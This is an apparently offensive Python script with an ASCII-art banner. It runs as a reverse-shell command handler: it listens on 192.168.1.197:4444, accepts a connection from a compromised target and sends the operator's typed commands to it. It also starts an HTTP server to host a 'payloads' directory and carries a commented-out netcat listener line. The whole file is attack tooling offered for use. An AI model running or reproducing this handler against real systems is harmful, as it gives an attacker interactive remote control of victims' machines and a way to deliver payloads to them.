import os, subprocess
import socket, sys, time


def banner():
    banner = [
        ' ______   _______                         ______   _______',
        '(  __  \ (  ____ )     |\     /||\     /|(  __  \ (  ____ \\',
        '| (  \  )| (    )|     | )   ( |( \   / )| (  \  )| (    \\/',
        '| |   ) || (____)|     | (___) | \\ (_) / | |   ) || (__    ',
        '| |   | ||     __)     |  ___  |  \\   /  | |   | ||  __)   ',
        '| |   ) || (\\ (        | (   ) |   ) (   | |   ) || (      ',
        '| (__/  )| ) \ \__ _   | )   ( |   | |   | (__/  )| (____/\\',
        '(______/ |/   \__/(_)  |/     \|   \_/   (______/ (_______/']
    for i in banner:
        print(i)


def listen(ip, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((ip, port))
    s.listen(1)
    print("Listening on port " + str(port))
    conn, addr = s.accept()
    print('Connection received from ', addr)
    while True:
        try:
            # Receive data from the target and get user input
            ans = conn.recv(8192).decode()
            sys.stdout.write('\n'+ans)
            command = input()

            # Send command
            command += "\n"
            conn.send(command.encode())
            time.sleep(.5)

            # Remove the output of the "input()" function
            sys.stdout.write("\033[A\033[A" + ans.split("\n")[-1])
        except KeyboardInterrupt:
            conn.close()


banner()
subprocess.Popen("python3 -m http.server --directory payloads")
# os.system('nc -lvnp 4444')
listen("192.168.1.197", 4444)

